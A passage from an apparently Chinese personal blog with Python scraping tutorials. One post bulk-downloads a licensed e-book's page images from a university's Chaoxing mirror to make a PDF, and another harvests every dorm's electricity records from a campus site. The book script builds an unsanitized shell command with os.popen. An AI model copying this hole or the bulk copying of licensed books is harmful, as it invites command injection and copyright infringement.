class="string">"finished"</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> p % <span class="number">5</span> == <span class="number">1</span>:</span><br><span class="line">        driver.find_element_by_link_text(<span class="string">"&gt;"</span>).click()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        driver.find_element_by_link_text(str(p)).click()</span><br></pre></td></tr></table></figure>
<p>Happy hacking~</p>
<p><img src="/images/spider/yingxin6.png" alt=""></p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/python/2015/04/04/chaoxing/" itemprop="url">
                  Python Spider: 超星图书爬取转换
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-04-04T00:00:00+08:00" content="2015-04-04">
              2015-04-04
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index">
                    <span itemprop="name">python</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/python/2015/04/04/chaoxing/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="python/2015/04/04/chaoxing/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="超星数字图书馆(北邮镜像):_在线阅读书籍爬取转换(selenium)">超星数字图书馆(北邮镜像): 在线阅读书籍爬取转换(selenium)</h2><blockquote>
<p>我忧心忡忡地看待未来，但仍满怀美好的希望。</p>
<p>—— Albert Schweitzer</p>
</blockquote>
<p>这次推荐selenium，自从有了selenium，爬虫从来没有这么简单过。</p>
<hr>
<p>几天前，一个工作的同学想让我帮他借一本书《聚酰亚胺新型材料》，他工作上需要看这本书的一些内容，但是这本书已经绝版，网上也没有出售。</p>
<p>于是我帮他搜索了下，图书馆里没有这本书。忽然想起来我邮还买了很多电子资源。</p>
<p>于是从图书馆主页选择<code>电子图书</code>-&gt;<code>超星数字电子图书数据</code>，进入如下页面。</p>
<p><img src="/images/spider/chaoxing.png" alt=""></p>
<p>搜索了下这本书，找到了一本。</p>
<p><img src="/images/spider/chaoxing1.png" alt=""></p>
<p>太棒了，下载下来……额……下载需要阅读器……</p>
<p><img src="/images/spider/chaoxing2.png" alt=""></p>
<p>对一个伪geek最讨厌的事情之一就是，某个牛比的企业倚杖其资源绑架用户安装所谓的客户端。比如讨厌的腾讯和讨厌的淘宝。</p>
<p>自然也不会下载什么阅读器，但是，既然可以在线看，那么就可以下载下来。实在在不行我浏览器截图行么。</p>
<p>selenium让一切成为可能(包括截图)。</p>
<p>让我们在线阅读：</p>
<p><img src="/images/spider/chaoxing3.png" alt=""></p>
<p>在线阅读提供了一些功能，包括索引、目录和文字提取，悲剧的是下载下来之后转成的pdf可没有这么多道道。虽然，如果肯花时间解决这些都不是问题……但是，我们又不是想pirate电子书……</p>
<p>对页面按右键发现这是个图片！接着观察对应的源码发现，是一个input标签，仔细观察这个input标签你可以看到很多属性，比如比较重要的class、scr、src、jpgname。</p>
<p>仔细多观察一个，你会发现，class是Jimg的似乎都是书页内容、jpgname属性是页码、scr和src好像都是书页图片地址。</p>
<p><img src="/images/spider/chaoxing4.png" alt=""></p>
<p>你可以试试。说服自己那些就是书页图片地址</p>
<p><img src="/images/spider/chaoxing6.png" alt=""></p>
<p>多看几个发现下面的页面其实src属性都是假的，猜测是书页滚动到某个页面，通过js动态修改src来实现实时加载而不是一下全加载。</p>
<p><img src="/images/spider/chaoxing5.png" alt=""></p>
<p>那么，我们抓取当前网页阅读页面所有class属性是<code>Jimg</code>的input标签的<code>scr</code>标签，就可以获取所有书页的图像了。</p>
<p>接下来，看看selenium是多么丧心病狂……</p>
<p>我们把以上所有从搜索到在线阅读的过程自动化……</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> imghdr</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line"><span class="comment"># bookname = u'聚酰亚胺新型材料'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    bookname = unicode(sys.argv[<span class="number">1</span>], <span class="string">'utf-8'</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[Usage:] chaoxing.py bookname"</span></span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line">driver = webdriver.Firefox()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先搜索</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://sslibbook2.sslibrary.com'</span></span><br><span class="line"></span><br><span class="line">driver.get(url)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入书名</span></span><br><span class="line">driver.find_element_by_id(<span class="string">'sword'</span>).send_keys(bookname)</span><br><span class="line"><span class="comment"># 检索</span></span><br><span class="line">driver.find_element_by_class_name(<span class="string">"btn-jiansuo"</span>).click()</span><br><span class="line"><span class="comment"># 检索结果</span></span><br><span class="line">driver.switch_to_frame(<span class="string">'book'</span>)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(len(driver.find_elements_by_class_name(<span class="string">'yy'</span>)) &gt; <span class="number">1</span>)</span><br><span class="line"><span class="comment"># 确认书名</span></span><br><span class="line"><span class="keyword">assert</span>(driver.find_elements_by_class_name(<span class="string">'yy'</span>)[<span class="number">0</span>].text</span><br><span class="line">       == <span class="string">u"《"</span> + bookname + <span class="string">u"》"</span>)</span><br><span class="line"><span class="comment"># 确认有网页阅读</span></span><br><span class="line"><span class="keyword">assert</span>(driver.find_elements_by_class_name(<span class="string">'yy'</span>)[<span class="number">1</span>].text == <span class="string">u'网页阅读'</span>)</span><br><span class="line"></span><br><span class="line">bookurl = driver.find_elements_by_class_name(<span class="string">'yy'</span>)[<span class="number">1</span>].get_attribute(<span class="string">'href'</span>)</span><br><span class="line"></span><br><span class="line">driver.get(bookurl)</span><br><span class="line"></span><br><span class="line"><span class="comment"># where img locate</span></span><br><span class="line">base_url = <span class="string">"http://"</span> + urllib2.urlparse.urlparse(driver.current_url).netloc</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(driver.page_source.find(<span class="string">u'超星'</span>) &gt;= <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">pages = driver.find_elements_by_xpath(<span class="string">'//input[@class="Jimg"]'</span>)</span><br><span class="line"></span><br><span class="line">filelist = [e.get_attribute(<span class="string">'jpgname'</span>) <span class="keyword">for</span> e <span class="keyword">in</span> pages]</span><br><span class="line"></span><br><span class="line">imglist = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> pages:</span><br><span class="line">    imglist[e.get_attribute(<span class="string">'jpgname'</span>)] = base_url + e.get_attribute(<span class="string">'scr'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> imglist.iteritems():</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(k):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        urllib.urlretrieve(v, k)</span><br><span class="line">        <span class="keyword">assert</span>(imghdr.what(k) == <span class="string">'png'</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">u'convert '</span> + <span class="string">u' '</span>.join(filelist) + <span class="string">' '</span> + bookname + <span class="string">u'.pdf'</span></span><br><span class="line">cmd = cmd.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">os.popen(cmd)</span><br></pre></td></tr></table></figure>
<p>稍微解释下，最后，是用imagemagick把一大堆png格式的书页内容转化成pdf格式。这个过程相当耗内存……如果有空就想想怎么换种方式转pdf，也愿各位看官能指教下。</p>
<p><img src="/images/spider/chaoxing7.png" alt=""></p>
<p>当然，我并没有把pdf传给任何人，我看完之后跟同学讲了讲，没有做任何盗版行径。同学们也要遵守用户守则，不要乱搞。</p>
<p>让我们引以为戒 <a href="http://zh.wikipedia.org/wiki/%E4%BA%9A%E4%BC%A6%C2%B7%E6%96%AF%E6%B2%83%E8%8C%A8" target="_blank" rel="external">Aaron Swartz</a></p>
<p><img src="img=http://upload.wikimedia.org/wikipedia/commons/thumb/0/06/Aaron_Swartz_profile.jpg/220px-Aaron_Swartz_profile.jpg" alt="Aaron Swartz"></p>
<p>非法下载书籍的罪名是非常非常严重的！！！！！</p>
<hr>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/python/2015/04/03/ydcx/" itemprop="url">
                  Python Spider: 北邮用电查询系统数据
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-04-03T00:00:00+08:00" content="2015-04-03">
              2015-04-03
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index">
                    <span itemprop="name">python</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/python/2015/04/03/ydcx/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="python/2015/04/03/ydcx/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="愿总有阳光照进回忆里：学生购电用电查询系统">愿总有阳光照进回忆里：学生购电用电查询系统</h2><p>感冒了，难得会被人挂念。谢谢，总有阳光照进回忆里，温暖的气息让人难以忘记。</p>
<hr>
<p>某天，一位大神师兄 @Zhaoking 神秘兮兮地给我看一个网站 <a href="http://ydcx.bupt.edu.cn/" target="_blank" rel="external">http://ydcx.bupt.edu.cn/</a></p>
<p>师兄说，你可以试着把它的数据爬下来。</p>
<p>当时开着八个线程跟着机器学习、回归分析、统计推断、探索性图形分析一堆数据分析的课程，觉得似乎把用电数据爬下来可以玩玩。<br>于是谨听师兄命令……</p>
<p><img src="/images/spider/ydcx.png" alt=""></p>
<p>首先，就是研究研究网站逻辑。打开firebug，输入1-101，回车。</p>
<p><img src="/images/spider/ydcx1.png" alt=""></p>
<p>显然，首先是一个post操作，但返回了一个302重定向，所以，第二个请求应该是正确的请求</p>
<p>试试看看</p>
<pre><code><span class="keyword">In</span> [<span class="number">1</span>]: import requests

<span class="keyword">In</span> [<span class="number">2</span>]: dorm_num = <span class="comment">'1-101'</span>

<span class="keyword">In</span> [<span class="number">3</span>]: r = requests.<span class="keyword">get</span>(<span class="comment">'http://ydcx.bupt.edu.cn/see.aspx?useid=' + dorm_num)</span>
</code></pre><p>检查下r.content，确认在里头看到了电量和加电信息。</p>
<p><img src="/images/spider/ydcx2.png" alt=""></p>
<p>那么，还有这么多页这么办？我们点点看看。页码1已经不能点了，点2。</p>
<p><img src="/images/spider/ydcx3.png" alt=""></p>
<p>竟然变成一个post了，而且post的数据这么多，你可以抱着试试看的心理不加上这些post的数据试试。</p>
<pre><code><span class="keyword">In</span> [<span class="number">5</span>]: __EVENTTARGET = <span class="string">'GridView1'</span>

<span class="keyword">In</span> [<span class="number">6</span>]: __EVENTARGUMENT = <span class="string">'Page$2'</span>

<span class="keyword">In</span> [<span class="number">7</span>]: <span class="keyword">data</span> = {<span class="string">'__EVENTTARGET'</span>: __EVENTTARGET,  <span class="string">'__EVENTARGUMENT'</span>: __EVENTARGUMENT}

<span class="keyword">In</span> [<span class="number">9</span>]: r = requests.post(<span class="string">'http://ydcx.bupt.edu.cn/see.aspx?useid='</span> + dorm_num, <span class="keyword">data</span>=<span class="keyword">data</span>)

<span class="keyword">In</span> [<span class="number">10</span>]: r
Out[<span class="number">10</span>]: &lt;Response [<span class="number">500</span>]&gt;
</code></pre><p>500——internal error……这个错误一般表示服务器内部处理出现错误。怎么回事呢，直觉告诉我们，问题就在于那些Post的参数。</p>
<p>加上试试，</p>
<pre><code> <span class="keyword">In</span> [<span class="number">15</span>]: <span class="keyword">data</span> = {<span class="string">'__EVENTTARGET'</span>: __EVENTTARGET,  <span class="string">'__EVENTARGUMENT'</span>: __EVENTARGUMENT, <span class="string">'__EVENTVALIDATION'</span>: <span class="string">'/wEWCwLMxp63CAKtsp64BAKtsuK4BAKtsva4BAKtsvq4BAKtsu64BAKtsvK4BAKtssa4BAKtssq4BALDuK6IBQKokYx1/Loh35D537/CRr+++EgM74nLP5E='</span>, <span class="string">'__VIEWSTATE'</span>: <span class="string">'/wEPDwULLTIwNzMwNzAxOTAPZBYCAgMPZBYQZg8PFgIeBFRleHQFATFkZAIBDw8WAh8ABQEgZGQCAg8PFgIfAAUyMS0xMDEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZAIDDw8WAh8ABQbnlLXku7dkZAIEDw8WAh8ABQwwMDAwMDAwMzg5NTVkZAIFDw8WAh8ABQ0xMC4yMTAuOTYuMjEwZGQCBg88KwANAQAPFgQeC18hRGF0YUJvdW5kZx4LXyFJdGVtQ291bnQCjQNkFgJmD2QWFgIBD2QWBmYPDxYCHwAFMjEtMTAxICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGQCAQ8PFgIfAAURMjAxNC04LTI0IDA6MDA6MDBkZAICDw8WAh8ABQMyMTVkZAICD2QWBmYPDxYCHwAFMjEtMTAxICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGQCAQ8PFgIfAAURMjAxNC04LTIzIDA6MDA6MDBkZAICDw8WAh8ABQMyMThkZAIDD2QWBmYPDxYCHwAFMjEtMTAxICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGQCAQ8PFgIfAAURMjAxNC04LTIyIDA6MDA6MDBkZAICDw8WAh8ABQMyMjBkZAIED2QWBmYPDxYCHwAFMjEtMTAxICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGQCAQ8PFgIfAAURMjAxNC04LTIxIDA6MDA6MDBkZAICDw8WAh8ABQMyMjNkZAIFD2QWBmYPDxYCHwAFMjEtMTAxICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGQCAQ8PFgIfAAURMjAxNC04LTIwIDA6MDA6MDBkZAICDw8WAh8ABQMyMjVkZAIGD2QWBmYPDxYCHwAFMjEtMTAxICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGQCAQ8PFgIfAAURMjAxNC04LTE5IDA6MDA6MDBkZAICDw8WAh8ABQMyMjhk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'</span>} 

<span class="keyword">In</span> [<span class="number">16</span>]: r = requests.post(<span class="string">'http://ydcx.bupt.edu.cn/see.aspx?useid='</span> + dorm_num, <span class="keyword">data</span>=<span class="keyword">data</span>)

<span class="keyword">In</span> [<span class="number">17</span>]: r
Out[<span class="number">17</span>]: &lt;Response [<span class="number">200</span>]&gt;
</code></pre><p>成功的返回了需要的用电数据，你可以检查下r.content看看</p>
<p>接下来的问题在于，这些参数从哪里来的？</p>
<p>简单谷歌下和检查下网页源代码，可以看到</p>
<p><img src="/images/spider/ydcx6.png" alt=""></p>
<p>那么逻辑就清晰了，先get请求某个寝室的页面，获取对应的post参数，然后一页一页往后翻就是。</p>
<p>下面讲讲如何从html源码中提取信息，用re当然可以，但是xpath这种东西也许更好用。比如</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## parse the content</span></span><br><span class="line">root = fromstring(r.content)</span><br><span class="line"><span class="comment">## extract __VIEWSTATE</span></span><br><span class="line">__VIEWSTATE = root.xpath(<span class="string">'//input[@name="__VIEWSTATE"]/@value'</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="comment">## extract __EVENTVALIDATION</span></span><br><span class="line">__EVENTVALIDATION = root.xpath(<span class="string">'//input[@name="__EVENTVALIDATION"]/@value'</span>)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
<p>相比写这么个正则简单优雅很多，不过所谓quick and dirty，不管黑猫白猫……：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.search(<span class="string">'id="__VIEWSTATE" value="([^"]+)", r.content).group(1)</span></span><br></pre></td></tr></table></figure>
<p>接下来的问题在于，页码总数我不知道，最后的一个…符号可以进入下一个十页。</p>
<p><img src="/images/spider/ydcx4.png" alt=""></p>
<p><img src="/images/spider/ydcx5.png" alt=""></p>
<p>那么，反正最后经过trial and error以一种很quick and dirty的方式work around页码这个问题……</p>
<p>我的解决方案，一个循环，页码不断加一，并且读取当前页右下角所有显示页码。</p>
<p>如果当前页面的那些页码cpn中最后一个，比我下一个想要抓取的np页码小一，或者当前页码个数不是十个，就肯定是最后几页了，就可以抓取然后break不继续往后抓取了。</p>
<p>if (int(cpn[-1]) == np - 1) or (int(cpn[-1]) % 10 != 0):</p>
<p>反正……最后可以运行……</p>
<p><img src="/images/spider/ydcx7.png" alt=""></p>
<p>多么不堪入目的实现，随便看看玩</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span><br><span class="line">用电信息</span><br><span class="line">http://ydcx.bupt.edu.cn/Default.aspx</span><br><span class="line">"""</span></span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">"Reverland"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line">monkey.patch_all()</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml.html <span class="keyword">import</span> fromstring</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">timeout = <span class="number">30</span></span><br><span class="line">socket.setdefaulttimeout(timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    os.makedirs(<span class="string">'data'</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_info</span><span class="params">(dorm_num, root)</span>:</span></span><br><span class="line">    <span class="comment"># skip for downloaded</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">'data/'</span> + dorm_num + <span class="string">'.csv'</span>):</span><br><span class="line">        <span class="keyword">print</span> dorm_num + <span class="string">'buy info downloaded...'</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    data = root.xpath(<span 